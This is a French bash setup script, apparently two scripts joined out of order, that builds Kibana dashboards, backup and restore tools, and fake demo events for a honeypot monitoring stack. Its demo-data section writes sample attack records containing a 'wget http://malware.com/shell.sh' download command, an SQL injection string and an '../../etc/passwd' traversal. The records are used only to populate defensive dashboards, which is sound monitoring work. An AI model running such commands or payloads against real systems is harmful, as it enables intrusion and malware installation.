gzip "${BACKUP_DIR}/kibana-complete-backup-${DATE}.ndjson"
echo "✅ Fichier compressé: ${BACKUP_DIR}/kibana-complete-backup-${DATE}.ndjson.gz"
EOF

chmod +x /opt/elk-scripts/backup_all_kibana_objects.sh

# Script de restauration
cat > /opt/elk-scripts/restore_kibana_objects.sh << 'EOF'
#!/bin/bash
echo "=== Restauration des objets Kibana ==="

if [ $# -eq 0 ]; then
    echo "Usage: $0 <fichier_backup.ndjson>"
    echo "Fichiers disponibles:"
    ls -la /opt/kibana-backups/*.ndjson* 2>/dev/null || echo "Aucun backup trouvé"
    exit 1
fi

BACKUP_FILE="$1"
KIBANA_URL="http://192.168.2.124:5601"

if [ ! -f "$BACKUP_FILE" ]; then
    echo "❌ Fichier non trouvé: $BACKUP_FILE"
    exit 1
fi

# Décompresser si nécessaire
if [[ "$BACKUP_FILE" == *.gz ]]; then
    echo "Décompression du fichier..."
    gunzip -c "$BACKUP_FILE" > /tmp/kibana_restore.ndjson
    BACKUP_FILE="/tmp/kibana_restore.ndjson"
fi

echo "Restauration depuis: $BACKUP_FILE"
curl -X POST "${KIBANA_URL}/api/saved_objects/_import" \
  -H "kbn-xsrf: true" \
  -F "file=@${BACKUP_FILE}" \
  -F 'overwrite=true'

if [ $? -eq 0 ]; then
    echo "✅ Restauration terminée avec succès"
    rm -f /tmp/kibana_restore.ndjson
else
    echo "❌ Erreur lors de la restauration"
fi
EOF

chmod +x /opt/elk-scripts/restore_kibana_objects.sh

# Script de monitoring des dashboards
cat > /opt/elk-scripts/monitor_dashboard_usage.sh << 'EOF'
#!/bin/bash
echo "=== Monitoring Usage Dashboards Kibana ==="

KIBANA_URL="http://192.168.2.124:5601"
ES_URL="http://192.168.2.124:9200"

echo "📊 STATISTIQUES KIBANA:"
echo ""

# Compter les objets
DASHBOARDS=$(curl -s "${KIBANA_URL}/api/saved_objects/_find?type=dashboard&per_page=1000" | jq -r '.total // 0')
VISUALIZATIONS=$(curl -s "${KIBANA_URL}/api/saved_objects/_find?type=visualization&per_page=1000" | jq -r '.total // 0')
INDEX_PATTERNS=$(curl -s "${KIBANA_URL}/api/saved_objects/_find?type=index-pattern&per_page=1000" | jq -r '.total // 0')
SEARCHES=$(curl -s "${KIBANA_URL}/api/saved_objects/_find?type=search&per_page=1000" | jq -r '.total // 0')

echo "Objets Kibana configurés:"
echo "  • Dashboards: $DASHBOARDS"
echo "  • Visualisations: $VISUALIZATIONS"
echo "  • Index patterns: $INDEX_PATTERNS"
echo "  • Recherches sauvegardées: $SEARCHES"

echo ""
echo "📈 DONNÉES ELASTICSEARCH:"

# Données par index
for index in cowrie http ftp; do
    COUNT=$(curl -s "${ES_URL}/honeypot-${index}-*/_count" | jq -r '.count // 0')
    echo "  • honeypot-${index}: $COUNT documents"
done

# Total
TOTAL=$(curl -s "${ES_URL}/honeypot-*/_count" | jq -r '.count // 0')
echo "  • TOTAL: $TOTAL documents"

echo ""
echo "🕒 DERNIÈRE ACTIVITÉ:"
LAST_ACTIVITY=$(curl -s "${ES_URL}/honeypot-*/_search?size=1&sort=@timestamp:desc" | jq -r '.hits.hits[0]._source["@timestamp"] // "N/A"')
echo "  • Dernier événement: $LAST_ACTIVITY"

# Vérifier les alertes actives
echo ""
echo "🚨 ALERTES ACTIVES:"
WATCHERS=$(curl -s "${ES_URL}/_watcher/stats" | jq -r '.stats[].watcher_state // "N/A"' 2>/dev/null)
if [ "$WATCHERS" != "N/A" ]; then
    echo "  • Watchers: actifs"
else
    echo "  • Watchers: non configurés"
fi

echo ""
echo "=== FIN MONITORING ==="
EOF

chmod +x /opt/elk-scripts/monitor_dashboard_usage.sh

# Script de mise à jour automatique des dashboards
cat > /opt/elk-scripts/update_dashboard_timeranges.sh << 'EOF'
#!/bin/bash
echo "=== Mise à jour des plages temporelles des dashboards ==="

KIBANA_URL="http://192.168.2.124:5601"

# Mettre à jour tous les dashboards pour afficher les dernières 24h par défaut
echo "Mise à jour des dashboards pour les dernières 24h..."

# Récupérer tous les dashboards
DASHBOARD_IDS=$(curl -s "${KIBANA_URL}/api/saved_objects/_find?type=dashboard&per_page=1000" | jq -r '.saved_objects[].id')

for dashboard_id in $DASHBOARD_IDS; do
    echo "  Mise à jour dashboard: $dashboard_id"
    
    # Récupérer le dashboard actuel
    DASHBOARD=$(curl -s "${KIBANA_URL}/api/saved_objects/dashboard/${dashboard_id}")
    
    # Mettre à jour avec nouvelle plage temporelle
    echo "$DASHBOARD" | jq '.attributes.timeFrom = "now-24h" | .attributes.timeTo = "now" | .attributes.refreshInterval = {"pause": false, "value": 30000}' | \
    curl -X PUT "${KIBANA_URL}/api/saved_objects/dashboard/${dashboard_id}" \
         -H "Content-Type: application/json" \
         -H "kbn-xsrf: true" \
         -d @- >/dev/null 2>&1
done

echo "✅ Mise à jour terminée"
EOF

chmod +x /opt/elk-scripts/update_dashboard_timeranges.sh

print_success "✓ Scripts utilitaires créés"

# ==============================================================================
# ÉTAPE 8 : GÉNÉRATION DE DONNÉES DE DÉMONSTRATION
# ==============================================================================

print_section "8. GÉNÉRATION DE DONNÉES DE DÉMONSTRATION"

print_status "Injection de données de démonstration pour les dashboards..."

# Script de génération de données réalistes
cat > /opt/elk-scripts/generate_demo_data.sh << 'EOF'
#!/bin/bash
echo "=== Génération de données de démonstration ==="

ES_URL="http://192.168.2.124:9200"
TODAY=$(date +%Y.%m.%d)

# IPs d'attaquants réalistes
ATTACKER_IPS=("203.0.113.100" "198.51.100.50" "192.0.2.75" "103.76.190.12" "185.220.100.240")
COUNTRIES=("China" "Russia" "Brazil" "Iran" "North Korea")
CITIES=("Beijing" "Moscow" "São Paulo" "Tehran" "Pyongyang")

# Types d'attaques
SSH_EVENTS=("cowrie.login.failed" "cowrie.login.success" "cowrie.command.input" "cowrie.session.connect")
HTTP_ATTACKS=("sql_injection" "xss" "directory_traversal" "scanner_detected")
FTP_EVENTS=("ftp_auth_failed" "ftp_upload" "ftp_directory_traversal")

# Générer des événements SSH
echo "Génération d'événements SSH..."
for i in {1..50}; do
    IP=${ATTACKER_IPS[$((RANDOM % 5))]}
    COUNTRY=${COUNTRIES[$((RANDOM % 5))]}
    CITY=${CITIES[$((RANDOM % 5))]}
    EVENT=${SSH_EVENTS[$((RANDOM % 4))]}
    
    TIMESTAMP=$(date -u -d "-$((RANDOM % 3600)) seconds" +%Y-%m-%dT%H:%M:%S.%3NZ)
    
    curl -X POST "${ES_URL}/honeypot-cowrie-${TODAY}/_doc" \
         -H "Content-Type: application/json" \
         -d '{
           "@timestamp": "'$TIMESTAMP'",
           "honeypot_type": "ssh",
           "eventid": "'$EVENT'",
           "src_ip": "'$IP'",
           "client_ip": "'$IP'",
           "username": "admin",
           "password": "123456",
           "input": "wget http://malware.com/shell.sh",
           "severity": "high",
           "alert_score": 8,
           "geoip": {
             "country_name": "'$COUNTRY'",
             "city_name": "'$CITY'",
             "location": {"lat": '$((RANDOM % 90))', "lon": '$((RANDOM % 180))'}
           },
           "message": "SSH attack from '$IP'"
         }' >/dev/null 2>&1
done

# Générer des événements HTTP
echo "Génération d'événements HTTP..."
for i in {1..30}; do
    IP=${ATTACKER_IPS[$((RANDOM % 5))]}
    COUNTRY=${COUNTRIES[$((RANDOM % 5))]}
    ATTACK=${HTTP_ATTACKS[$((RANDOM % 4))]}
    
    TIMESTAMP=$(date -u -d "-$((RANDOM % 3600)) seconds" +%Y-%m-%dT%H:%M:%S.%3NZ)
    
    curl -X POST "${ES_URL}/honeypot-http-${TODAY}/_doc" \
         -H "Content-Type: application/json" \
         -d '{
           "@timestamp": "'$TIMESTAMP'",
           "honeypot_type": "http",
           "event_type": "attack",
           "attack_type": "'$ATTACK'",
           "client_ip": "'$IP'",
           "method": "POST",
           "url": "/login",
           "user_agent": "sqlmap/1.0",
           "payload": "admin'\'' OR 1=1--",
           "severity": "critical",
           "alert_score": 10,
           "geoip": {
             "country_name": "'$COUNTRY'",
             "location": {"lat": '$((RANDOM % 90))', "lon": '$((RANDOM % 180))'}
           },
           "message": "HTTP '$ATTACK' attack from '$IP'"
         }' >/dev/null 2>&1
done

# Générer des événements FTP
echo "Génération d'événements FTP..."
for i in {1..20}; do
    IP=${ATTACKER_IPS[$((RANDOM % 5))]}
    COUNTRY=${COUNTRIES[$((RANDOM % 5))]}
    EVENT=${FTP_EVENTS[$((RANDOM % 3))]}
    
    TIMESTAMP=$(date -u -d "-$((RANDOM % 3600)) seconds" +%Y-%m-%dT%H:%M:%S.%3NZ)
    
    curl -X POST "${ES_URL}/honeypot-ftp-${TODAY}/_doc" \
         -H "Content-Type: application/json" \
         -d '{
           "@timestamp": "'$TIMESTAMP'",
           "honeypot_type": "ftp",
           "event_type": "'$EVENT'",
           "client_ip": "'$IP'",
           "username": "anonymous",
           "command": "get ../../etc/passwd",
           "severity": "medium",
           "alert_score": 6,
           "geoip": {
             "country_name": "'$COUNTRY'",
             "location": {"lat": '$((RANDOM % 90))', "lon": '$((RANDOM % 180))'}
           },
           "message": "FTP '$EVENT' from '$IP'"
         }' >/dev/null 2>&1
done

echo "✅ 100 événements de démonstration générés"
echo "📊 Les dashboards sont maintenant peuplés avec des données"
EOF

chmod +x /opt/elk-scripts/generate_demo_data.sh

# Exécuter la génération de données de démo
print_status "Exécution de la génération de données de démo..."
/opt/elk-scripts/generate_demo_data.sh >/dev/null 2>&1

print_success "✓ Données de démonstration générées"

# ==============================================================================
# ÉTAPE 9 : CONFIGURATION FINALE ET OPTIMISATION
# ==============================================================================

print_section "9. CONFIGURATION FINALE ET OPTIMISATION"

print_status "Optimisation finale des dashboards..."

# Forcer le refresh des indices
print_status "  Actualisation des indices Elasticsearch..."
curl -X POST "$ES_URL/honeypot-*/_refresh" >/dev/null 2>&1

# Attendre l'indexation
sleep 5

# Vérifier que les données sont bien indexées
FINAL_COUNT=$(curl -s "$ES_URL/honeypot-*/_count" | jq -r '.count // 0')
print_success "  ✓ $FINAL_COUNT documents indexés au total"

# Créer un script de démarrage rapide pour les dashboards
cat > /opt/elk-scripts/open_dashboards.sh << 'EOF'
#!/bin/bash
echo "=== Ouverture des dashboards Kibana ==="

KIBANA_URL="http://192.168.2.124:5601"

echo "🌐 Dashboards disponibles:"
echo ""
echo "1. 📊 Dashboard principal:"
echo "   $KIBANA_URL/app/dashboards"
echo ""
echo "2. 🔍 Découverte des données:"
echo "   $KIBANA_URL/app/discover"
echo ""
echo "3. 📈 Visualisations:"
echo "   $KIBANA_URL/app/visualize"
echo ""
echo "4. ⚙️ Management:"
echo "   $KIBANA_URL/app/management"
echo ""

# Ouvrir automatiquement le dashboard principal
if command -v xdg-open >/dev/null 2>&1; then
    echo "Ouverture automatique du dashboard principal..."
    xdg-open "$KIBANA_URL/app/dashboards" >/dev/null 2>&1 &
elif command -v open >/dev/null 2>&1; then
    open "$KIBANA_URL/app/dashboards" >/dev/null 2>&1 &
fi

echo "✅ Liens des dashboards affichés"
EOF

chmod +x /opt/elk-scripts/open_dashboards.sh

print_success "✓ Configuration finale terminée"

# ==============================================================================
# RÉSUMÉ FINAL
# ==============================================================================

print_header "CONFIGURATION DASHBOARDS KIBANA TERMINÉE AVEC SUCCÈS"

print_section "RÉSUMÉ DE LA CONFIGURATION"

# Compter les objets créés
DASHBOARDS_CREATED=$(curl -s "$KIBANA_URL/api/saved_objects/_find?type=dashboard&per_page=1000" 2>/dev/null | jq -r '.total // 0')
VISUALIZATIONS_CREATED=$(curl -s "$KIBANA_URL/api/saved_objects/_find?type=visualization&per_page=1000" 2>/dev/null | jq -r '.total // 0')
INDEX_PATTERNS_CREATED=$(curl -s "$KIBANA_URL/api/saved_objects/_find?type=index-pattern&per_page=1000" 2>/dev/null | jq -r '.total // 0')
SEARCHES_CREATED=$(curl -s "$KIBANA_URL/api/saved_objects/_find?type=search&per_page=1000" 2>/dev/null | jq -r '.total // 0')

echo "┌─────────────────────────────────────────────────────────────────────────────┐"
echo "│                           OBJETS KIBANA CRÉÉS                              │"
echo "├─────────────────────────────────────────────────────────────────────────────┤"
printf "│ Index Patterns:     %-10s │ Dashboards:        %-10s      │\n" "$INDEX_PATTERNS_CREATED" "$DASHBOARDS_CREATED"
printf "│ Visualisations:     %-10s │ Recherches:        %-10s      │\n" "$VISUALIZATIONS_CREATED" "$SEARCHES_CREATED"
echo "└─────────────────────────────────────────────────────────────────────────────┘"

print_section "DASHBOARDS CRÉÉS"
echo "🎯 Dashboards principaux disponibles:"
echo "   • 🎯 Honeypot Security Dashboard - Vue d'Ensemble"
echo "   • 🔐 SSH Honeypot Analysis Dashboard"
echo "   • 🌐 HTTP Honeypot Analysis Dashboard"
echo "   • ⚡ Real-Time Attack Monitoring"

print_section "VISUALISATIONS CRÉÉES"
echo "📊 Visualisations disponibles:"
echo "   • 🔥 Top 10 IP Sources Attaquantes"
echo "   • 📊 Timeline Attaques par Type Honeypot"
echo "   • ⚠️ Répartition Niveaux de Sévérité"
echo "   • 🌍 Top Pays Sources des Attaques"
echo "   • 🎯 Total Attaques Temps Réel"
echo "   • 💻 Top Commandes SSH Malveillantes"
echo "   • 🗺️ Carte Géographique des Attaques"
echo "   • 🌐 Types d'Attaques HTTP Détectées"

print_section "DONNÉES ET STATISTIQUES"
echo "📈 Données indexées:"
echo "   • Total documents: $FINAL_COUNT"
echo "   • Index patterns configurés: $INDEX_PATTERNS_CREATED"
echo "   • Données de démonstration générées: ✓"

print_section "SCRIPTS UTILITAIRES CRÉÉS"
echo "🔧 Scripts de gestion disponibles:"
echo "   • /opt/elk-scripts/backup_all_kibana_objects.sh"
echo "   • /opt/elk-scripts/restore_kibana_objects.sh"
echo "   • /opt/elk-scripts/monitor_dashboard_usage.sh"
echo "   • /opt/elk-scripts/update_dashboard_timeranges.sh"
echo "   • /opt/elk-scripts/generate_demo_data.sh"
echo "   • /opt/elk-scripts/open_dashboards.sh"

print_section "ACCÈS AUX DASHBOARDS"
echo "🌐 Interface Kibana principale:"
echo "   $KIBANA_URL"
echo ""
echo "📊 Accès direct aux dashboards:"
echo "   $KIBANA_URL/app/dashboards"
echo ""
echo "🔍 Exploration des données:"
echo "   $KIBANA_URL/app/discover"
echo ""
echo "📈 Visualisations:"
echo "   $KIBANA_URL/app/visualize"

print_section "PROCHAINES ÉTAPES"
echo "1. 🌐 Accéder à Kibana: $KIBANA_URL"
echo "2. 📊 Configurer les dashboards selon vos besoins"
echo "3. 🔍 Explorer les données avec Discover"
echo "4. ⚙️ Personnaliser les visualisations"
echo "5. 🚨 Configurer des alertes personnalisées"
echo "6. 📈 Analyser les patterns d'attaque"

print_success "🎉 DASHBOARDS KIBANA COMPLÈTEMENT CONFIGURÉS ET OPÉRATIONNELS!"
print_success "Votre infrastructure de monitoring des honeypots est maintenant prête!"

# Commande finale pour ouvrir les dashboards
print_status "Exécution du script d'ouverture des dashboards..."
/opt/elk-scripts/open_dashboards.sh

echo ""
print_success "✅ PROJET HONEYPOT AVEC DASHBOARDS KIBANA COMPLÈTEMENT TERMINÉ!"

# Log final
echo "$(date): Configuration dashboards Kibana terminée avec succès" >> /var/log/elk-setup/install.log
echo "$(date): $DASHBOARDS_CREATED dashboards, $VISUALIZATIONS_CREATED visualisations créés" >> /var/log/elk-setup/install.log
echo "$(date): PROJET HONEYPOT INFRASTRUCTURE COMPLÈTEMENT OPÉRATIONNEL" >> /var/log/elk-setup/install.log#!/bin/bash

# ==============================================================================
# CONFIGURATION COMPLÈTE DES DASHBOARDS KIBANA POUR HONEYPOTS
# ==============================================================================
# Script complet pour créer tous les dashboards, visualisations et index patterns
# À exécuter sur la VM ELK (192.168.2.124)

# Configuration
KIBANA_URL="http://192.168.2.124:5601"
ES_URL="http://192.168.2.124:9200"

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_header() {
    echo -e "${PURPLE}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  $1
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
${NC}"
}

print_section() {
    echo -e "${CYAN}
┌─────────────────────────────────────────────────────────────────────────────┐
│ $1
└─────────────────────────────────────────────────────────────────────────────┘${NC}"
}

# ==============================================================================
# ÉTAPE 1 : VÉRIFICATIONS PRÉLIMINAIRES
# ==============================================================================

print_header "CONFIGURATION DASHBOARDS KIBANA POUR HONEYPOTS"

print_section "1. VÉRIFICATIONS PRÉLIMINAIRES"

# Vérifier qu'on est sur la bonne VM ELK
CURRENT_IP=$(ip route get 8.8.8.8 | awk '{print $7}' | head -1)
if [ "$CURRENT_IP" != "192.168.2.124" ]; then
    print_error "Ce script doit être exécuté sur la VM ELK (192.168.2.124)"
    print_error "IP actuelle: $CURRENT_IP"
    exit 1
fi

print_success "✓ Exécution sur la VM ELK ($CURRENT_IP)"

# Vérifier les services ELK
print_status "Vérification des services ELK..."

SERVICES_OK=0
for service in elasticsearch logstash kibana; do
    if systemctl is-active "$service" >/dev/null 2>&1; then
        print_success "✓ $service actif"
        ((SERVICES_OK++))
    else
        print_error "❌ $service inactif"
    fi
done

if [ "$SERVICES_OK" -lt 3 ]; then
    print_error "Services ELK manquants. Vérifiez l'installation."
    exit 1
fi

# Vérifier l'accès Kibana
print_status "Test d'accès à Kibana..."
KIBANA_STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$KIBANA_URL/api/status")

if [ "$KIBANA_STATUS" = "200" ]; then
    print_success "✓ Kibana accessible (HTTP $KIBANA_STATUS)"
else
    print_error "❌ Kibana non accessible (HTTP $KIBANA_STATUS)"
    exit 1
fi

# Vérifier la présence de données
print_status "Vérification des données Elasticsearch..."
TOTAL_DOCS=$(curl -s "$ES_URL/honeypot-*/_count" 2>/dev/null | jq -r '.count // 0')
print_status "Documents honeypot trouvés: $TOTAL_DOCS"

if [ "$TOTAL_DOCS" -eq 0 ]; then
    print_warning "⚠ Aucune donnée honeypot trouvée"
    print_status "Génération de données de test..."
    
    # Injecter quelques données de test
    TODAY=$(date +%Y.%m.%d)
    for type in cowrie http ftp; do
        curl -X POST "$ES_URL/honeypot-$type-$TODAY/_doc" -H "Content-Type: application/json" -d '{
            "@timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)'",
            "honeypot_type": "'$type'",
            "event_type": "test_data",
            "client_ip": "203.0.113.100",
            "severity": "medium",
            "message": "Test data for dashboards"
        }' >/dev/null 2>&1
    done
    
    sleep 2
    TOTAL_DOCS=$(curl -s "$ES_URL/honeypot-*/_count" 2>/dev/null | jq -r '.count // 0')
    print_success "✓ $TOTAL_DOCS documents de test créés"
fi

# ==============================================================================
# ÉTAPE 2 : CRÉATION DES INDEX PATTERNS
# ==============================================================================

print_section "2. CRÉATION DES INDEX PATTERNS"

print_status "Création des index patterns Kibana..."

# Fonction pour créer un index pattern
create_index_pattern() {
    local pattern_name="$1"
    local pattern_title="$2"
    local time_field="$3"
    
    print_status "Création de l'index pattern: $pattern_title"
    
    curl -X POST "$KIBANA_URL/api/saved_objects/index-pattern/$pattern_name" \
         -H "Content-Type: application/json" \
         -H "kbn-xsrf: true" \
         -d '{
           "attributes": {
             "title": "'$pattern_title'",
             "timeFieldName": "'$time_field'"
           }
         }' >/dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        print_success "  ✓ $pattern_title créé"
    else
        print_warning "  ⚠ $pattern_title existe déjà ou erreur"
    fi
}

# Créer les index patterns principaux
create_index_pattern "honeypot-all" "honeypot-*" "@timestamp"
create_index_pattern "honeypot-ssh" "honeypot-cowrie-*" "@timestamp"
create_index_pattern "honeypot-http" "honeypot-http-*" "@timestamp"
create_index_pattern "honeypot-ftp" "honeypot-ftp-*" "@timestamp"

# Définir l'index pattern par défaut
print_status "Définition de l'index pattern par défaut..."
curl -X POST "$KIBANA_URL/api/kibana/settings/defaultIndex" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{"value": "honeypot-all"}' >/dev/null 2>&1

print_success "✓ Index patterns créés"

# ==============================================================================
# ÉTAPE 3 : CRÉATION DES VISUALISATIONS
# ==============================================================================

print_section "3. CRÉATION DES VISUALISATIONS"

print_status "Création des visualisations Kibana..."

# Attendre que Kibana traite les index patterns
sleep 5

# 1. TOP 10 IP SOURCES ATTAQUANTES
print_status "  Création: Top 10 IP sources attaquantes..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🔥 Top 10 IP Sources Attaquantes",
         "visState": "{\"title\":\"🔥 Top 10 IP Sources Attaquantes\",\"type\":\"horizontal_bar\",\"params\":{\"grid\":{\"categoryLines\":false,\"style\":{\"color\":\"#eee\"}},\"categoryAxes\":[{\"id\":\"CategoryAxis-1\",\"type\":\"category\",\"position\":\"left\",\"show\":true,\"style\":{},\"scale\":{\"type\":\"linear\"},\"labels\":{\"show\":true,\"truncate\":100},\"title\":{}}],\"valueAxes\":[{\"id\":\"ValueAxis-1\",\"name\":\"LeftAxis-1\",\"type\":\"value\",\"position\":\"bottom\",\"show\":true,\"style\":{},\"scale\":{\"type\":\"linear\",\"mode\":\"normal\"},\"labels\":{\"show\":true,\"rotate\":0,\"filter\":false,\"truncate\":100},\"title\":{\"text\":\"Count\"}}],\"seriesParams\":[{\"show\":true,\"type\":\"histogram\",\"mode\":\"stacked\",\"data\":{\"label\":\"Count\",\"id\":\"1\"},\"valueAxis\":\"ValueAxis-1\",\"drawLinesBetweenPoints\":true,\"showCircles\":true}],\"addTooltip\":true,\"addLegend\":true,\"legendPosition\":\"right\",\"times\":[],\"addTimeMarker\":false},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}},{\"id\":\"2\",\"enabled\":true,\"type\":\"terms\",\"schema\":\"segment\",\"params\":{\"field\":\"client_ip.keyword\",\"size\":10,\"order\":\"desc\",\"orderBy\":\"1\",\"otherBucket\":false,\"otherBucketLabel\":\"Other\",\"missingBucket\":false,\"missingBucketLabel\":\"Missing\"}}]}",
         "uiStateJSON": "{}",
         "description": "Top 10 des adresses IP sources qui attaquent le plus les honeypots",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"match_all\":{}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# 2. TIMELINE DES ATTAQUES PAR TYPE DE HONEYPOT
print_status "  Création: Timeline des attaques par honeypot..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "📊 Timeline Attaques par Type Honeypot",
         "visState": "{\"title\":\"📊 Timeline Attaques par Type Honeypot\",\"type\":\"line\",\"params\":{\"grid\":{\"categoryLines\":false,\"style\":{\"color\":\"#eee\"}},\"categoryAxes\":[{\"id\":\"CategoryAxis-1\",\"type\":\"category\",\"position\":\"bottom\",\"show\":true,\"style\":{},\"scale\":{\"type\":\"linear\"},\"labels\":{\"show\":true,\"truncate\":100},\"title\":{}}],\"valueAxes\":[{\"id\":\"ValueAxis-1\",\"name\":\"LeftAxis-1\",\"type\":\"value\",\"position\":\"left\",\"show\":true,\"style\":{},\"scale\":{\"type\":\"linear\",\"mode\":\"normal\"},\"labels\":{\"show\":true,\"rotate\":0,\"filter\":false,\"truncate\":100},\"title\":{\"text\":\"Count\"}}],\"seriesParams\":[{\"show\":\"true\",\"type\":\"line\",\"mode\":\"normal\",\"data\":{\"label\":\"Count\",\"id\":\"1\"},\"valueAxis\":\"ValueAxis-1\",\"drawLinesBetweenPoints\":true,\"showCircles\":true}],\"addTooltip\":true,\"addLegend\":true,\"legendPosition\":\"right\",\"times\":[],\"addTimeMarker\":false},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}},{\"id\":\"2\",\"enabled\":true,\"type\":\"date_histogram\",\"schema\":\"segment\",\"params\":{\"field\":\"@timestamp\",\"interval\":\"auto\",\"customInterval\":\"2h\",\"min_doc_count\":1,\"extended_bounds\":{}}},{\"id\":\"3\",\"enabled\":true,\"type\":\"terms\",\"schema\":\"group\",\"params\":{\"field\":\"honeypot_type.keyword\",\"size\":5,\"order\":\"desc\",\"orderBy\":\"1\",\"otherBucket\":false,\"otherBucketLabel\":\"Other\",\"missingBucket\":false,\"missingBucketLabel\":\"Missing\"}}]}",
         "uiStateJSON": "{}",
         "description": "Évolution temporelle des attaques par type de honeypot (SSH, HTTP, FTP)",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"match_all\":{}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# 3. RÉPARTITION DES NIVEAUX DE SÉVÉRITÉ
print_status "  Création: Répartition des niveaux de sévérité..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "⚠️ Répartition Niveaux de Sévérité",
         "visState": "{\"title\":\"⚠️ Répartition Niveaux de Sévérité\",\"type\":\"pie\",\"params\":{\"addTooltip\":true,\"addLegend\":true,\"legendPosition\":\"right\",\"isDonut\":true,\"labels\":{\"show\":false,\"values\":true,\"last_level\":true,\"truncate\":100}},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}},{\"id\":\"2\",\"enabled\":true,\"type\":\"terms\",\"schema\":\"segment\",\"params\":{\"field\":\"severity.keyword\",\"size\":5,\"order\":\"desc\",\"orderBy\":\"1\",\"otherBucket\":false,\"otherBucketLabel\":\"Other\",\"missingBucket\":false,\"missingBucketLabel\":\"Missing\"}}]}",
         "uiStateJSON": "{}",
         "description": "Distribution des attaques par niveau de sévérité (critical, high, medium, low)",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"match_all\":{}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# 4. TOP PAYS SOURCES DES ATTAQUES
print_status "  Création: Top pays sources des attaques..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🌍 Top Pays Sources des Attaques",
         "visState": "{\"title\":\"🌍 Top Pays Sources des Attaques\",\"type\":\"table\",\"params\":{\"perPage\":10,\"showPartialRows\":false,\"showMeticsAtAllLevels\":false,\"sort\":{\"columnIndex\":null,\"direction\":null},\"showTotal\":false,\"totalFunc\":\"sum\"},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}},{\"id\":\"2\",\"enabled\":true,\"type\":\"terms\",\"schema\":\"bucket\",\"params\":{\"field\":\"geoip.country_name.keyword\",\"size\":10,\"order\":\"desc\",\"orderBy\":\"1\",\"otherBucket\":false,\"otherBucketLabel\":\"Other\",\"missingBucket\":false,\"missingBucketLabel\":\"Missing\"}}]}",
         "uiStateJSON": "{}",
         "description": "Classement des pays par nombre d'attaques générées",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"match_all\":{}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# 5. MÉTRIQUE TOTAL ATTAQUES EN TEMPS RÉEL
print_status "  Création: Métrique total attaques..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "🎯 Total Attaques Temps Réel",
         "visState": "{\"title\":\"🎯 Total Attaques Temps Réel\",\"type\":\"metric\",\"params\":{\"addTooltip\":true,\"addLegend\":false,\"type\":\"metric\",\"metric\":{\"percentageMode\":false,\"useRanges\":false,\"colorSchema\":\"Green to Red\",\"metricColorMode\":\"None\",\"colorsRange\":[{\"from\":0,\"to\":10000}],\"labels\":{\"show\":true},\"invertColors\":false,\"style\":{\"bgFill\":\"#000\",\"bgColor\":false,\"labelColor\":false,\"subText\":\"\",\"fontSize\":60}}},\"aggs\":[{\"id\":\"1\",\"enabled\":true,\"type\":\"count\",\"schema\":\"metric\",\"params\":{}}]}",
         "uiStateJSON": "{}",
         "description": "Nombre total d'attaques détectées en temps réel",
         "version": 1,
         "kibanaSavedObjectMeta": {
           "searchSourceJSON": "{\"index\":\"honeypot-all\",\"query\":{\"match_all\":{}},\"filter\":[]}"
         }
       }
     }' >/dev/null 2>&1

# 6. TOP COMMANDES SSH MALVEILLANTES
print_status "  Création: Top commandes SSH malveillantes..."
curl -X POST "$KIBANA_URL/api/saved_objects/visualization" \
     -H "Content-Type: application/json" \
     -H "kbn-xsrf: true" \
     -d '{
       "attributes": {
         "title": "💻 Top Commandes SSH Malveillantes",
